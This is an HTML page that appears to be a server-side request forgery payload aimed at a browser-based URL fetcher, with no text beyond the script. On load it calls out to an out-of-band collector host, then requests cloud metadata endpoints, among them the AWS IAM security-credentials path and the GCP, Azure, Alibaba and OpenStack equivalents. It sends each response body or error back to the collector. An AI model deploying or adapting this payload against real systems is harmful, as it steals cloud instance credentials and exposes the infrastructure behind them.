<!DOCTYPE html>
<html>
<head><title>t</title></head>
<body>
<script>
var OOB = 'd9qqn036b8mca44t21ngtga6reafwpokp.oast.pro';
var T0 = Date.now();

function fire(path) {
  new Image().src = 'http://' + OOB + path + '&r=' + Math.random();
  fetch('http://' + OOB + path + '&r=' + Math.random(), {mode:'no-cors'}).catch(function(){});
}

// Alive
fire('/alive3?ms=0&ua=' + encodeURIComponent(navigator.userAgent.slice(0, 80)));

// 169.254.169.254 focused probes — timeout 5000ms for Chromium fetcher
var ll_targets = [
  ['imds-root',  'http://169.254.169.254/'],
  ['imds-meta',  'http://169.254.169.254/latest/meta-data/'],
  ['imds-iam',   'http://169.254.169.254/latest/meta-data/iam/security-credentials/'],
  ['imds-gcp',   'http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json'],
  ['imds-yc',    'http://169.254.169.254/computeMetadata/v1/project/project-id'],
  ['imds-az',    'http://169.254.169.254/metadata/instance?api-version=2021-02-01'],
  ['imds-ali',   'http://100.100.100.200/latest/meta-data/'],
  ['imds-os',    'http://169.254.169.254/openstack/latest/meta_data.json'],
];

ll_targets.forEach(function(t) {
  var label = t[0], url = t[1];
  var t0 = Date.now();
  fetch(url, {signal: AbortSignal.timeout(5000)})
    .then(function(r) {
      return r.text().then(function(body) {
        fire('/OK-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 400)));
      });
    })
    .catch(function(e) {
      fire('/err-' + label + '?ms=' + (Date.now()-t0) + '&e=' + encodeURIComponent(e.message.slice(0,80)));
    });
});

// Also try XHR (different PNA handling than fetch in some Chromium builds)
var xhr = new XMLHttpRequest();
xhr.timeout = 5000;
xhr.onload = function() {
  fire('/OK-xhr-imds?ms=' + (Date.now()-T0) + '&s=' + xhr.status + '&d=' + encodeURIComponent(xhr.responseText.slice(0,400)));
};
xhr.onerror = function() {
  fire('/err-xhr-imds?ms=' + (Date.now()-T0) + '&e=error');
};
xhr.ontimeout = function() {
  fire('/err-xhr-imds?ms=' + (Date.now()-T0) + '&e=timeout');
};
xhr.open('GET', 'http://169.254.169.254/latest/meta-data/');
xhr.send();
</script>
</body>
</html>
